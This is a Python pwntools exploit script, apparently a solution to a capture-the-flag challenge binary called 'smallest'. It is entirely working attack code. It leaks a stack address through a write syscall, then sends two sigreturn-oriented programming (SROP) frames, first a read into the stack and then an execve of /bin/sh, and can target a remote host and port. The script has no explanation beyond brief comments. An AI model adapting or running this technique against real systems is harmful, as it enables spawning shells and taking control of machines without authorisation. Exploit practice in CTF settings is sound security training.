from pwn import *
context(os="linux", arch="amd64")

g_fname = "./smallest"

def debug_on():
	context.log_level = "debug"

if args.REMOTE:
	g_io = remote(args.HOST,int(args.PORT))
else:
	g_io = process(g_fname)

def getpid():
	if args["REMOTE"] == "":
		print("PID:%d", g_io.proc.pid)
		pause()

def pwn():
	start_addr = 0x4000b0	
	sys_ret_addr = 0x4000be

	# read to stack, make it looks like:
	# |start_addr|start_addr|start_addr|...
	g_io.send(p64(start_addr)*3)
	
	# 2nd read 1 byte, make rax==1, and skip 'xor rax, rax'
	# equivalent to write(1, $rsp, 0x400)
	g_io.send(b'\xb3')

	# 3rd. ret to syscall(__NR_write, 1, $rsp, 0x400)
	if args.REMOTE:
		g_io.recv(0x178)
	else:
		g_io.recv(8)
	stack_addr = (u64(g_io.recv(8)) - 0x1000) & 0xfffffffffffff000
	log.success("stack addr = %#x", stack_addr)

	# construct sigcontext: read(0, stack_addr, 0x400)
	sfm = SigreturnFrame()
	sfm.rax = int(constants.SYS_read)
	sfm.rdi = 0
	sfm.rsi = stack_addr
	sfm.rdx = 0x400
	sfm.rip = sys_ret_addr # Anywhere is ok, execve() should not return.
	sfm.rsp = stack_addr + 0x200

	payload_read = flat([start_addr, 0xdeadbeef, sfm])
	payload_ret_sigreturn = flat([sys_ret_addr, 'a'*7])
	pause()	
	g_io.send(payload_read)
	pause()
	g_io.send(payload_ret_sigreturn)

	# construct sigcontext: execve("/bin/sh", 0, 0)
	sfm = SigreturnFrame()
	sfm.rax = int(constants.SYS_execve)
	sfm.rdi = stack_addr # "/bin/sh\0"
	sfm.rsi = sfm.rdx = 0
	sfm.rip = sys_ret_addr
	sfm.rsp = stack_addr + 0x200 # Anywhere is ok.

	payload_exec = flat(["/bin/sh\0".ljust(0x200), start_addr, 0xdeadbeef, sfm])
	pause()
	g_io.send(payload_exec)
	pause()
	g_io.send(payload_ret_sigreturn)


if "__main__" == __name__:
	pwn()
	g_io.interactive()
	
